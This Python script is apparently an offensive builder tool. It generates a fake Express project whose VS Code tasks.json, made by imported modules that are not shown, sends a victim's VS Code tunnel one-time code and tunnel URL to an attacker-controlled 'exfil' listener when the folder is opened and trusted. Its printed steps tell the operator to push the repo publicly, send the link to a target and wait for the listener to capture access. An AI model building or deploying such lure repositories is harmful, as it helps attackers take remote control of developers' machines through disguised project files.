#!/usr/bin/env python3
import os
import sys
import random
import argparse
from pathlib import Path

# Import generators (assumed to exist in modules/)
from modules import express_generator, package_generator, readme_generator, git_generator

def get_tasks_generator(os_type):
    """Dynamically import the correct tasks generator based on OS."""
    if os_type == 'linux':
        from modules import tasks_generator_linux as tasks_generator
    else:
        from modules import tasks_generator as tasks_generator
    return tasks_generator

class VSCodeTunnelOTPBuilder:
    def __init__(self, project_name, exfil_url, os_type='windows', output_dir=None):
        self.project_name = project_name
        self.exfil_url = exfil_url.rstrip('/')
        self.os_type = os_type.lower()
        self.output_dir = Path(output_dir or f"repo_{project_name}")

    def build(self):
        print(f"[+] Building VSCode Tunnel OTP repo: {self.project_name}")
        print(f"[+] Target OS: {self.os_type}")
        print(f"[+] Exfil URL: {self.exfil_url}/tunnel\n")
        
        self._create_dirs()
        
        # Generate tasks.json with the appropriate OS version
        tasks_generator = get_tasks_generator(self.os_type)
        tasks_generator.create(self.output_dir, self.exfil_url)
        
        # Generate the rest of the fake project
        express_generator.create(self.output_dir)
        package_generator.create(self.output_dir, self.project_name)
        readme_generator.create(self.output_dir, self.project_name)
        git_generator.create(self.output_dir)
        
        print(f"\n[+] Repository created: {self.output_dir}")
        print(f"[+] Next steps:")
        print(f"    1. Start listener: python3 listener.py")
        print(f"    2. Push repo: cd {self.output_dir} && gh repo create {self.project_name} --public --source=. --push")
        print(f"    3. Send link to target")
        print(f"    4. When victim opens & trusts, listener will show OTP then tunnel URL")
        return self.output_dir

    def _create_dirs(self):
        (self.output_dir / ".vscode").mkdir(parents=True, exist_ok=True)
        (self.output_dir / "src").mkdir(parents=True, exist_ok=True)
        (self.output_dir / "tests").mkdir(parents=True, exist_ok=True)

def main():
    parser = argparse.ArgumentParser(description='VSCode Tunnel OTP Builder')
    parser.add_argument('--project', help='Project/repo name')
    parser.add_argument('--exfil', help='Listener URL (e.g., http://your-server:8080)')
    parser.add_argument('--os', choices=['windows', 'linux'], default='windows',
                        help='Target operating system (default: windows)')
    parser.add_argument('--output', help='Output directory')
    args = parser.parse_args()
    
    project = args.project
    if not project:
        project = input("[?] Project name: ").strip()
        if not project:
            project = f"project-{random.randint(1000,9999)}"
            print(f"[*] Using: {project}")
    
    exfil = args.exfil
    if not exfil:
        exfil = input("[?] Listener URL (e.g., http://your-server:8080): ").strip()
        if not exfil:
            print("[-] Listener URL required")
            sys.exit(1)
    
    builder = VSCodeTunnelOTPBuilder(
        project_name=project,
        exfil_url=exfil,
        os_type=args.os,
        output_dir=args.output
    )
    builder.build()

if __name__ == '__main__':
    main()
